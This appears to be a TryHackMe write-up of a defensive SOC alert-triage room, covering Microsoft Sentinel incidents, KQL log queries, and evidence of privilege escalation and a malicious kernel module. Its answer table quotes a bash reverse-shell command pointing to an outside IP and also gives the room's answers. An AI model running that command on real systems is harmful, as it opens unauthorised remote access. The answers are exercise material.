# 🛡️ TryHackMe Write-Up  
## SOC Alert Triaging – Tinsel Triage  
*(Advent of Cyber 2025 – Day 10)*

---

## 📌 Overview

This room focuses on **SOC alert triaging and incident investigation** using  
**Microsoft Sentinel**, a cloud-native SIEM and SOAR platform. The exercise walks
through reviewing incidents, analysing related alerts, pivoting into log data,
and validating suspicious activity across multiple Linux hosts.

The objective is to help analysts understand how to:

- Prioritise alerts
- Correlate related events
- Investigate evidence
- Identify attacker actions
- Validate incidents using **KQL log analysis**

---

## 🧩 Room Information

| Field | Details |
|------|--------|
| Platform | TryHackMe |
| Room Name | SOC Alert Triaging – Tinsel Triage |
| Event | Advent of Cyber 2025 |
| Category | Blue Team / SOC / SIEM |
| Difficulty | Beginner–Intermediate |
| Estimated Time | ~45 minutes |
| Status | Completed (100%) |

---

## 🎯 Objectives

- Understand the SOC alert triage workflow  
- Review high-severity incidents in Microsoft Sentinel  
- Correlate alerts affecting the same entity  
- Drill into supporting evidence and event timelines  
- Use **KQL queries** to analyse raw logs  
- Identify signs of privilege escalation and persistence  

---

## 🧠 SOC Triage Concepts

### 🔹 Why Alert Triaging Matters

SOC analysts must:

- Prioritise alerts by **severity & impact**
- Identify when multiple alerts are related
- Detect **attack progression stages**, such as:
  - Initial Access
  - Privilege Escalation
  - Persistence
  - Lateral Movement

---

### 🔹 Related Alert Correlation

Multiple alerts tied to the same entity (host, user, or IP) may indicate a
single ongoing intrusion. In this room, examples included:

| Alert | Meaning |
|------|--------|
| Root SSH Login from External IP | Initial access to host |
| SUID Discovery | Priv-Esc reconnaissance |
| Kernel Module Insertion | Persistence / kernel-level tampering |

This helps build the **attack timeline**.

---

## 🔍 Investigation Walkthrough

---

## 🧪 Step 1 — Reviewing Incidents in Microsoft Sentinel

From the **Incidents** page:

- High-severity alerts were prioritised
- The alert **Linux PrivEsc – Kernel Module Insertion** was opened
- Evidence revealed:
  - Multiple affected entities
  - Privilege-escalation behaviour
  - Related alerts sharing the same host

Analysts then pivoted into the **full alert details** view.

---

## 🗂 Step 2 — Viewing Evidence & Timeline

From the Evidence panel:

- Kernel modules installed across multiple systems
- Event timestamps aligned with suspicious host activity
- Several alerts linked to the same compromised machines

This indicated a coordinated intrusion rather than isolated behaviour.

---

## 🧾 Step 3 — Deep-Dive Log Analysis (KQL)

Investigating host **app-02**:

set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == "app-02"
| project _timestamp_t, host_s, Message
✔ Findings included:
Copying /etc/shadow backup (credential tampering)

User alice added to sudoers group

backupuser modified by root

Malicious kernel module inserted:

malicious_mod.ko
Successful root SSH login

📌 These events together indicate privilege escalation and persistence.

🧠 Analyst Interpretation
The activity sequence suggested:

Compromise of privileged access

Priv-Esc attempt followed by persistence

Host-level modification by attacker

Therefore, incidents were valid and required response.

🚩 Answers Collected
🔸 Alert Triage Questions
Question	Answer
Entities affected by Polkit Exploit Attempt	10
Severity of Sudo Shadow Access alert	High
Accounts added to sudoers group	4

🔸 Log Investigation Questions
Question	Answer
Kernel module installed on websrv-01	malicious_mod.ko
Unusual command run by ops on websrv-01	/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
Source IP of first successful SSH login to storage-01	172.16.0.12
External IP logging in as root on app-01	203.0.113.45
Additional sudoers user on app-01	deploy

🧠 Key Learnings
High-severity alerts should be triaged first

Related alerts often represent a single attack chain

KQL enables deep forensic log review

Priv-Esc signs include:

sudoer changes

shadow file access

kernel module loading

SSH logins from unusual IPs require investigation

SOC work requires context + correlation, not single-alert decisions

🔐 Security Takeaway
Alert triaging is not just about clearing alerts — it is about identifying
patterns, correlating events, and understanding how an attack unfolds across
systems.

✅ Conclusion
This room provided practical experience in SOC alert triage and log-based
incident investigation using Microsoft Sentinel. By combining alert context
with raw event analysis, analysts can accurately differentiate false positives
from real compromises and respond effectively.

🔗 References
TryHackMe Room — SOC Alert Triaging: Tinsel Triage
https://tryhackme.com/room/soctinseltriage
